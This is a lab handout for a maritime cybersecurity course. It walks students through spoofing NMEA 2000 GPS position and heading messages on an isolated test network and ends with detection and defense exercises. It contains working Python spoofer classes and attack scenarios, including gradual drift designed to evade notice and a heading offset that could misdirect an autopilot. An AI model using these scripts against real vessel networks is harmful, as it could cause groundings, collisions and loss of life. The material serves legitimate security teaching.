---
title: "Lab 06"
subtitle: "Navigation Spoofing Attack"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    Executing GPS position and heading spoofing attacks
---

# Lab 06 -- Navigation Spoofing Attack

## Lab Overview

**Duration**: 2 hours
**Prerequisites**: Labs 04-05 completed, Class 05 material reviewed
**Materials Required**:
- OpenBridge hardware
- Baseline from Lab 05
- Access to test network with chart plotter display

## CRITICAL SAFETY WARNING

**ALL ACTIVITIES IN THIS LAB ARE ON ISOLATED TEST NETWORKS ONLY**

Navigation spoofing on real vessels could cause:
- Grounding
- Collisions
- Loss of life

**Students must sign ethics agreement before proceeding.**

By continuing, you acknowledge this lab is:
- For educational purposes only
- On isolated test network
- Not to be applied to real vessels without authorization

## Objectives

By the end of this lab, you will:

1. Construct valid position messages (PGN 129025)
2. Execute position spoofing attack
3. Construct heading messages (PGN 127250)
4. Observe effects on chart plotter
5. Document attack parameters

## Part 1: Position Spoofing Preparation (30 minutes)

### 1.1 Review Target Information

From Lab 05, identify the legitimate GPS:

- Source Address: _______
- PGN 129025 frequency: _______ Hz
- PGN 129026 frequency: _______ Hz

### 1.2 Calculate Position Values

Convert decimal degrees to raw values:

**Target Position**: Newport, RI (41.49°N, 71.31°W)

```python
#!/usr/bin/env python3
"""
position_calculator.py - Calculate raw position values
"""
import struct

def calculate_position_raw(latitude_deg, longitude_deg):
    """
    Convert decimal degrees to NMEA 2000 raw values

    PGN 129025 format:
    - Latitude: 1e-7 degrees, signed int32
    - Longitude: 1e-7 degrees, signed int32
    """
    # Convert to raw values
    lat_raw = int(latitude_deg / 1e-7)
    lon_raw = int(longitude_deg / 1e-7)

    # Pack as signed 32-bit integers
    data = struct.pack('<ii', lat_raw, lon_raw)

    return lat_raw, lon_raw, data

# Calculate values
lat_deg = 41.49    # Newport, RI
lon_deg = -71.31   # West = negative

lat_raw, lon_raw, data = calculate_position_raw(lat_deg, lon_deg)

print(f"Latitude: {lat_deg}° → {lat_raw}")
print(f"Longitude: {lon_deg}° → {lon_raw}")
print(f"Data bytes: {data.hex()}")

# Verify reverse calculation
lat_verify = lat_raw * 1e-7
lon_verify = lon_raw * 1e-7
print(f"\nVerification:")
print(f"  Lat: {lat_verify}°")
print(f"  Lon: {lon_verify}°")
```

**Record your calculated values:**
- Latitude raw: _________________
- Longitude raw: _________________
- Data hex: _________________

### 1.3 Calculate Attack Positions

Calculate raw values for these spoofed positions:

| Position | Lat (deg) | Lon (deg) | Lat (raw) | Lon (raw) |
|----------|-----------|-----------|-----------|-----------|
| Newport | 41.49 | -71.31 | | |
| Block Island | 41.17 | -71.58 | | |
| 1nm north of actual | +0.0167 | 0 | | |
| 10nm offshore | | | | |

### 1.4 Review Legitimate Traffic

Capture legitimate position messages for comparison:

```bash
# From OpenBridge monitor mode
# Record several legitimate position messages
```

Note the source address and data format.

<!--
Instructor Notes:

Ensure students calculate values correctly before attacking.
Wrong values = unrealistic attack = less educational.

Common mistakes:
- Forgetting negative for West longitude
- Using wrong scale factor
- Byte order errors

Walk through calculation with class.
-->

## Part 2: Execute Position Spoofing (30 minutes)

### 2.1 Build Position Spoofer

```python
#!/usr/bin/env python3
"""
position_spoofer.py - Position spoofing via OpenBridge
"""
import serial
import time
import struct

class PositionSpoofer:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)  # Wait for connection

    def spoof_position(self, latitude_deg, longitude_deg, rate_hz=10):
        """
        Send spoofed position at specified rate

        OpenBridge command format for PGN 129025:
        4,<latitude>,<longitude>
        """
        interval = 1.0 / rate_hz
        command = f"4,{latitude_deg},{longitude_deg}\n"

        print(f"Spoofing position: {latitude_deg}, {longitude_deg}")
        print(f"Rate: {rate_hz} Hz")
        print("Press Ctrl+C to stop")

        try:
            while True:
                self.ser.write(command.encode())
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\nSpoofing stopped")

    def spoof_position_sequence(self, positions, dwell_time_sec=10, rate_hz=10):
        """
        Spoof sequence of positions

        Args:
            positions: List of (lat, lon) tuples
            dwell_time_sec: Time to hold each position
            rate_hz: Transmission rate
        """
        for lat, lon in positions:
            print(f"\nSpoofing: {lat}, {lon} for {dwell_time_sec}s")
            start = time.time()
            interval = 1.0 / rate_hz

            while (time.time() - start) < dwell_time_sec:
                command = f"4,{lat},{lon}\n"
                self.ser.write(command.encode())
                time.sleep(interval)

    def close(self):
        self.ser.close()
```

### 2.2 Attack Scenario 1: Sudden Position Jump

Execute sudden position change and observe chart plotter:

```python
# Spoof sudden jump to Newport
spoofer = PositionSpoofer('/dev/ttyACM0')

# Jump to Newport, RI
spoofer.spoof_position(41.49, -71.31, rate_hz=10)
```

**Observe and record:**
- Did chart plotter update? YES / NO
- Time to display update: _______ seconds
- Any warnings displayed? _____________

### 2.3 Attack Scenario 2: Gradual Drift

Execute gradual position drift:

```python
# Gradual drift northward
positions = []
start_lat = 41.45
start_lon = -71.40

# Create drift path (0.01 degree increments)
for i in range(20):
    positions.append((start_lat + i * 0.005, start_lon))

spoofer.spoof_position_sequence(positions, dwell_time_sec=30, rate_hz=10)
```

**Observe and record:**
- Was drift noticeable to observer? YES / NO
- At what point did observer notice? ____________
- Total drift distance: _______ nm

### 2.4 Attack Scenario 3: Race Condition

Spoof at same rate as legitimate GPS:

```python
# Match legitimate GPS rate (from Lab 05 baseline)
legitimate_rate = 10  # Hz

# Spoof at same rate
spoofer.spoof_position(41.49, -71.31, rate_hz=legitimate_rate)
```

**Observe:**
- Does chart plotter show both positions?
- Which position dominates display?
- Is there flickering?

## Part 3: Heading Spoofing (30 minutes)

### 3.1 Calculate Heading Values

```python
#!/usr/bin/env python3
"""
heading_calculator.py - Calculate heading raw values
"""
import struct
import math

def calculate_heading_raw(heading_deg, reference='magnetic'):
    """
    Convert heading degrees to NMEA 2000 raw values

    PGN 127250 format:
    - Heading: radians × 10000, unsigned 16-bit
    """
    # Convert to radians
    heading_rad = math.radians(heading_deg)

    # Convert to raw (× 10000)
    heading_raw = int(heading_rad * 10000)

    # Reference byte (0=True, 1=Magnetic)
    ref_byte = 1 if reference == 'magnetic' else 0

    return heading_raw, ref_byte

# Calculate values
for heading in [0, 45, 90, 180, 270]:
    raw, ref = calculate_heading_raw(heading)
    print(f"Heading {heading:3d}° → raw: {raw}")
```

### 3.2 Build Heading Spoofer

```python
class HeadingSpoofer:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)

    def spoof_heading(self, heading_deg, rate_hz=10):
        """
        Send spoofed heading at specified rate

        OpenBridge command format for PGN 127250:
        2,<sid>,<heading_rad>,<deviation>,<variation>,<reference>
        """
        import math
        heading_rad = math.radians(heading_deg)
        interval = 1.0 / rate_hz

        # SID=1, deviation=0, variation=0, reference=1(magnetic)
        command = f"2,1,{heading_rad:.4f},0.0,0.0,1\n"

        print(f"Spoofing heading: {heading_deg}°")

        try:
            while True:
                self.ser.write(command.encode())
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\nSpoofing stopped")
```

### 3.3 Attack Scenario: Heading Offset

Spoof heading that differs from actual by 10°:

```python
# If actual heading is 90° (East), spoof 100°
actual_heading = 90
offset = 10
spoof_heading = actual_heading + offset

spoofer = HeadingSpoofer('/dev/ttyACM0')
spoofer.spoof_heading(spoof_heading, rate_hz=10)
```

**Observe on chart plotter:**
- Does displayed heading change? YES / NO
- Is there oscillation between values? YES / NO
- Note any course line changes: _____________

### 3.4 Attack Scenario: Autopilot Manipulation

**SIMULATION ONLY** - Discuss expected effects:

If autopilot is engaged with target course 090°:
- Actual heading: 090°
- Spoofed heading: 100° (10° offset)

**Predict autopilot behavior:**
- Autopilot thinks vessel is pointing ____°
- Autopilot will apply _______ rudder
- Vessel will actually turn _______

**This is extremely dangerous on real vessels!**

## Part 4: Detection Opportunities (15 minutes)

### 4.1 What Made Attack Visible?

As you executed attacks, what might an IDS detect?

| Observable | Your Attack | Detection Method |
|------------|-------------|------------------|
| Message rate doubled | | Frequency monitor |
| Sudden position jump | | Value delta check |
| Wrong source address | | Device allowlist |
| Different clock timing | | Fingerprinting |

### 4.2 Evaluate Your Attack

Rate your attacks on detectability:

| Attack | Detectability (1-5) | How to Improve Stealth |
|--------|---------------------|------------------------|
| Sudden position jump | | |
| Gradual drift | | |
| Heading offset | | |

### 4.3 Design Detection Rule

Write a pseudocode detection rule for one attack:

```python
# Example: Position jump detection
def detect_position_jump(new_pos, old_pos, max_delta_nm=0.5):
    """
    Detect sudden position changes

    Args:
        new_pos: (lat, lon) of new position
        old_pos: (lat, lon) of previous position
        max_delta_nm: Maximum expected change in nautical miles

    Returns:
        bool: True if anomaly detected
    """
    # Calculate distance
    # If distance > max_delta_nm and time < threshold
    # Return True
    pass
```

## Part 5: Documentation (15 minutes)

### 5.1 Attack Log

Complete the attack documentation:

| Attack | Start Time | Duration | Parameters | Effect Observed |
|--------|------------|----------|------------|-----------------|
| Position jump | | | | |
| Position drift | | | | |
| Heading offset | | | | |

### 5.2 Screenshots/Evidence

Capture evidence of successful attacks:
- Chart plotter showing spoofed position
- Before/after comparison
- Any error messages displayed

### 5.3 Defense Recommendations

Based on your attacks, recommend defenses:

1. **Position verification**: _________________
2. **Rate monitoring**: _________________
3. **Cross-validation**: _________________

## Deliverables

Submit via course portal:

1. **Position calculator output** - Showing your calculations
2. **Attack scripts** - Python files used
3. **Attack log** - Table documenting each attack
4. **Evidence** - Screenshots of chart plotter effects
5. **Lab report** - Including detection recommendations

## Evaluation Criteria

| Criterion | Points |
|-----------|--------|
| Position values correctly calculated | 20 |
| Position spoofing executed | 25 |
| Heading spoofing executed | 25 |
| Detection analysis complete | 15 |
| Documentation quality | 15 |
| **Total** | **100** |

## Reflection Questions

Answer in your lab report:

1. Why did the chart plotter trust your spoofed messages?
2. What physical checks could verify GPS position?
3. How would a crew member notice position spoofing?
4. What is the most dangerous aspect of heading spoofing?

## Next Lab Preview

In Lab 07, you will:
- Attack engine parameter systems
- Spoof RPM and temperature values
- Create false alarm conditions
- Analyze safety implications
